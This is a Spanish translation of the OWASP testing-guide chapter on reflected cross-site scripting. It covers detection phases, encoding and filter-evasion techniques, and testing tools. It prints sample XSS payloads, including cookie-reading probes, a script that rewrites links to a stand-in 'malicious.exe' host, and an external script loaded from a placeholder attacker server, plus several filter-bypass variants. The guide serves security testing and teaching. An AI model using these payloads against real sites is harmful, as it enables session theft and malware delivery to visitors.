# Pruebas de scripting entre sitios reflejado

|ID          |
|------------|
|WSTG-INPV-01|

## Resumen

El [scripting entre sitios reflejado (XSS)](https://owasp.org/www-community/attacks/xss/) ocurre cuando un atacante inyecta código ejecutable en el navegador dentro de una sola respuesta HTTP. El ataque inyectado no se almacena dentro de la aplicación en sí; es no persistente y solo afecta a los usuarios que abren un enlace maliciosamente diseñado o una página web de terceros. La cadena de ataque se incluye como parte de la URI diseñada o parámetros HTTP, procesados incorrectamente por la aplicación, y devueltos a la víctima.

Los XSS reflejados son el tipo más frecuente de ataques XSS encontrados en la naturaleza. Los ataques XSS reflejados también se conocen como ataques XSS no persistentes y, dado que la carga útil del ataque se entrega y ejecuta a través de una sola solicitud y respuesta, también se denominan XSS de primer orden o tipo 1.

Cuando una aplicación web es vulnerable a este tipo de ataque, pasará entrada no validada enviada a través de solicitudes de vuelta al cliente. El modus operandi común del ataque incluye un paso de diseño, en el que el atacante crea y prueba una URI ofensiva, un paso de ingeniería social, en el que convence a sus víctimas de cargar esta URI en sus navegadores, y la eventual ejecución del código ofensivo utilizando el navegador de la víctima.

Comúnmente, el código del atacante se escribe en el lenguaje JavaScript, pero también se usan otros lenguajes de scripting, por ejemplo, ActionScript y VBScript. Los atacantes suelen aprovechar estas vulnerabilidades para instalar registradores de teclas, robar cookies de víctimas, realizar robo de portapapeles y cambiar el contenido de la página (por ejemplo, enlaces de descarga).

Una de las dificultades principales en la prevención de vulnerabilidades XSS es la codificación adecuada de caracteres. En algunos casos, el servidor web o la aplicación web podrían no estar filtrando algunas codificaciones de caracteres, por lo que, por ejemplo, la aplicación web podría filtrar `<script>`, pero podría no filtrar `%3cscript%3e` que simplemente incluye otra codificación de etiquetas.

## Objetivos de la prueba

- Identificar variables que se reflejan en respuestas.
- Evaluar la entrada que aceptan y la codificación que se aplica al devolver (si la hay).

## Cómo probar

### Pruebas de caja negra

Una prueba de caja negra incluirá al menos tres fases:

#### Detectar vectores de entrada

Detectar vectores de entrada. Para cada página web, el probador debe determinar todas las variables definidas por el usuario de la aplicación web y cómo ingresarlas. Esto incluye entradas ocultas o no obvias como parámetros HTTP, datos POST, valores de campos de formulario ocultos y valores de radio o selección predefinidos. Típicamente se usan editores HTML en navegador o proxies web para ver estas variables ocultas. Vea el ejemplo a continuación.

#### Analizar vectores de entrada

Analizar cada vector de entrada para detectar posibles vulnerabilidades. Para detectar una vulnerabilidad XSS, el probador normalmente usará datos de entrada especialmente diseñados con cada vector de entrada. Tales datos de entrada son típicamente inofensivos, pero activan respuestas del navegador web que manifiestan la vulnerabilidad. Los datos de prueba se pueden generar usando un fuzzer de aplicación web, una lista automatizada predefinida de cadenas de ataque conocidas, o manualmente.
Algunos ejemplos de tales datos de entrada son los siguientes:

- `<script>alert(123)</script>`
- `"><script>alert(document.cookie)</script>`

Para una lista completa de posibles cadenas de prueba, consulte la [Hoja de trucos de evasión de filtros XSS](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).

#### Verificar impacto

Para cada entrada de prueba intentada en la fase anterior, el probador analizará el resultado y determinará si representa una vulnerabilidad que tiene un impacto realista en la seguridad de la aplicación web. Esto requiere examinar el HTML de la página web resultante y buscar la entrada de prueba. Una vez encontrada, el probador identifica cualquier carácter especial que no se haya codificado, reemplazado o filtrado correctamente. El conjunto de caracteres especiales vulnerables no filtrados dependerá del contexto de esa sección de HTML.

Idealmente, todos los caracteres especiales de HTML se reemplazarán con entidades HTML. Las entidades HTML clave a identificar son:

- `>` (mayor que)
- `<` (menor que)
- `&` (ampersand)
- `'` (apóstrofo o comilla simple)
- `"` (comilla doble)

Sin embargo, una lista completa de entidades está definida por las especificaciones HTML y XML. [Wikipedia tiene una referencia completa](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references).

Dentro del contexto de una acción HTML o código JavaScript, un conjunto diferente de caracteres especiales necesitará ser escapado, codificado, reemplazado o filtrado. Estos caracteres incluyen:

- `\n` (nueva línea)
- `\r` (retorno de carro)
- `'` (apóstrofo o comilla simple)
- `"` (comilla doble)
- `\` (barra invertida)
- `\uXXXX` (valores unicode)

Para una referencia más completa, consulte la [guía de JavaScript de Mozilla](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings).

#### Ejemplo 1

Por ejemplo, considere un sitio que tiene un aviso de bienvenida `Welcome %username%` y un enlace de descarga.

![XSS Example 1](images/XSS_Example1.png)\
*Figura 4.7.1-1: Ejemplo XSS 1*

El probador debe sospechar que cada punto de entrada de datos puede resultar en un ataque XSS. Para analizarlo, el probador jugará con la variable de usuario e intentará activar la vulnerabilidad.

Intentemos hacer clic en el siguiente enlace y ver qué sucede:

```text
https://example.com/index.php?user=<script>alert(123)</script>
```

Si no se aplica ninguna sanitización, esto resultará en la siguiente ventana emergente:

![Alert](images/Alert.png)\
*Figura 4.7.1-2: Ejemplo XSS 1*

Esto indica que hay una vulnerabilidad XSS y parece que el probador puede ejecutar código de su elección en el navegador de cualquiera si hace clic en el enlace del probador.

#### Ejemplo 2

Intentemos otra pieza de código (enlace):

```text
https://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");AllLinks[0].href = "https://badexample.com/malicious.exe";}</script>
```

Esto produce el siguiente comportamiento:

![XSS Example 2](images/XSS_Example2.png)\
*Figura 4.7.1-3: Ejemplo XSS 2*

Esto hará que el usuario, al hacer clic en el enlace proporcionado por el probador, descargue el archivo `malicious.exe` desde un sitio que controlan.

### Eludir filtros XSS

Los ataques de scripting entre sitios reflejado se previenen ya que la aplicación web sanitiza la entrada, un firewall de aplicación web bloquea la entrada maliciosa, o por mecanismos integrados en navegadores web modernos. El probador debe probar vulnerabilidades asumiendo que los navegadores web no prevendrán el ataque. Los navegadores pueden estar desactualizados o tener características de seguridad integradas deshabilitadas. Del mismo modo, los firewalls de aplicación web no están garantizados para reconocer ataques novedosos, desconocidos. Un atacante podría diseñar una cadena de ataque que no sea reconocida por el firewall de aplicación web.

Por lo tanto, la mayoría de la prevención XSS debe depender de la sanitización de la aplicación web de entrada de usuario no confiable. Hay varios mecanismos disponibles para los desarrolladores para la sanitización, como devolver un error, eliminar, codificar o reemplazar entrada inválida. Los medios por los que la aplicación detecta y corrige entrada inválida es otra debilidad primaria en la prevención de XSS. Una lista de denegación puede no incluir todas las posibles cadenas de ataque, una lista de permisos puede ser demasiado permisiva, la sanitización podría fallar, o un tipo de entrada puede ser incorrectamente confiado y permanecer sin sanitizar. Todos estos permiten a los atacantes eludir filtros XSS.

La [Hoja de trucos de evasión de filtros XSS](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) documenta pruebas comunes de evasión de filtros.

#### Ejemplo 3: Valor de atributo de etiqueta

Dado que estos filtros se basan en una lista de denegación, no podrían bloquear cada tipo de expresiones. De hecho, hay casos en los que un exploit XSS se puede llevar a cabo sin el uso de etiquetas `<script>` e incluso sin el uso de caracteres como `<` y `>` que comúnmente se filtran.

Por ejemplo, la aplicación web podría usar el valor de entrada del usuario para llenar un atributo, como se muestra en el siguiente código:

```html
<input type="text" name="state" value="INPUT_FROM_USER">
```

Entonces un atacante podría enviar el siguiente código:

```text
" onfocus="alert(document.cookie)
```

#### Ejemplo 4: Sintaxis o codificación diferente

En algunos casos es posible que los filtros basados en firmas se puedan derrotar simplemente ofuscando el ataque. Típicamente puedes hacer esto a través de la inserción de variaciones inesperadas en la sintaxis o en la codificación. Estas variaciones son toleradas por los navegadores como HTML válido cuando el código se devuelve, y sin embargo también podrían ser aceptadas por el filtro.

Siguiendo algunos ejemplos:

- `"><script >alert(document.cookie)</script >`
- `"><ScRiPt>alert(document.cookie)</ScRiPt>`
- `"%3cscript%3ealert(document.cookie)%3c/script%3e`

#### Ejemplo 5: Eludir filtrado no recursivo

A veces la sanitización se aplica solo una vez y no se realiza recursivamente. En este caso el atacante puede vencer el filtro enviando una cadena que contiene múltiples intentos, como esta:

```text
<scr<script>ipt>alert(document.cookie)</script>
```

#### Ejemplo 6: Incluir script externo

Ahora suponga que los desarrolladores del sitio objetivo implementaron el siguiente código para proteger la entrada de la inclusión de script externo:

```php
<?
    $re = "/<script[^>]+src/i";

    if (preg_match($re, $_GET['var']))
    {
        echo "Filtered";
        return;
    }
    echo "Welcome ".$_GET['var']." !";
?>
```

Desacoplando la expresión regular anterior:

1. Verificar por un `<script`
2. Verificar por un " " (espacio en blanco)
3. Cualquier carácter pero el carácter `>` para una o más ocurrencias
4. Verificar por un `src`

Esto es útil para filtrar expresiones como `<script src="https://attacker/xss.js"></script>` que es un ataque común. Pero, en este caso, es posible eludir la sanitización usando el carácter `>` en un atributo entre script y src, como esto:

```text
https://example/?var=<SCRIPT%20a=">"%20SRC="https://attacker/xss.js"></SCRIPT>
```

Esto explotará la vulnerabilidad de scripting entre sitios reflejado mostrada antes, ejecutando el código JavaScript almacenado en el servidor web del atacante como si se originara desde el sitio de la víctima, `https://example/`.

#### Ejemplo 7: Contaminación de parámetros HTTP (HPP)

Otro método para eludir filtros es la Contaminación de Parámetros HTTP, esta técnica fue presentada por primera vez por Stefano di Paola y Luca Carettoni en 2009 en la conferencia OWASP Poland. Consulte [Pruebas de contaminación de parámetros HTTP](04-Testing_for_HTTP_Parameter_Pollution.md) para más información. Esta técnica de evasión consiste en dividir un vector de ataque entre múltiples parámetros que tienen el mismo nombre. La manipulación del valor de cada parámetro depende de cómo cada tecnología web analiza estos parámetros, por lo que este tipo de evasión no siempre es posible. Si el entorno probado concatena los valores de todos los parámetros con el mismo nombre, entonces un atacante podría usar esta técnica para eludir mecanismos de seguridad basados en patrones.
Ataque regular:

```text
https://example/page.php?param=<script>[...]</script>
```

Ataque usando HPP:

```text
https://example/page.php?param=<script&param=>[...]</&param=script>
```

Consulte la [Hoja de trucos de evasión de filtros XSS](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) para una lista más detallada de técnicas de evasión de filtros. Finalmente, analizar respuestas puede volverse complejo. Una forma simple de hacer esto es usar código que aparezca un diálogo, como en nuestro ejemplo. Esto típicamente indica que un atacante podría ejecutar JavaScript arbitrario de su elección en los navegadores de los visitantes.

### Pruebas de caja gris

Las pruebas de caja gris son similares a las pruebas de caja negra. En las pruebas de caja gris, el probador de penetración tiene conocimiento parcial de la aplicación. En este caso, información sobre entrada de usuario, controles de validación de entrada y cómo se renderiza la entrada de usuario de vuelta al usuario podría ser conocida por el probador de penetración.

Si el código fuente está disponible (pruebas de caja blanca), todas las variables recibidas de usuarios deberían analizarse. Además, el probador debería analizar cualquier procedimiento de sanitización implementado para decidir si estos pueden ser eludidos.

## Herramientas

- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) le ayuda a codificar textos arbitrarios hacia y desde 65 tipos de conjuntos de caracteres que puede usar en sus cargas útiles personalizadas.
- [Hackvertor](https://hackvertor.co.uk/public) es una herramienta en línea que permite muchos tipos de codificación y ofuscación de JavaScript (o cualquier entrada de cadena).
- [XSS-Proxy](https://xss-proxy.sourceforge.net/) es una herramienta avanzada de ataque de Cross-Site-Scripting (XSS).
- [ratproxy](https://code.google.com/archive/p/ratproxy/) es una herramienta de auditoría de seguridad de aplicaciones web semi-automatizada, en gran medida pasiva, optimizada para una detección precisa y sensible, y anotación automática, de problemas potenciales y patrones de diseño relevantes para la seguridad basados en la observación de tráfico iniciado por el usuario existente en entornos web 2.0 complejos.
- [Burp Proxy](https://portswigger.net/burp/) es un servidor proxy HTTP/S interactivo para atacar y probar aplicaciones web.
- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org) es un servidor proxy HTTP/S interactivo para atacar y probar aplicaciones web con un escáner integrado.

## Referencias

### Recursos OWASP

- [Hoja de trucos de evasión de filtros XSS](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

### Libros

- Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0
- Dafydd Stuttard, Marcus Pinto - "The Web Application's Handbook - Discovering and Exploiting Security Flaws", 2008, Wiley, ISBN 978-0-470-17077-9
- Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10: 1-59749-154-3

### Documentos técnicos

- [CERT - Etiquetas HTML maliciosas incrustadas en solicitudes web del cliente](https://resources.sei.cmu.edu/asset_files/WhitePaper/2000_019_001_496188.pdf)
- [cgisecurity.com - The Cross Site Scripting FAQ](https://www.cgisecurity.com/xss-faq.html)
- [S. Frei, T. Dübendorfer, G. Ollmann, M. May - Understanding the Web browser threat](https://www.techzoom.net/Publications/Insecurity-Iceberg)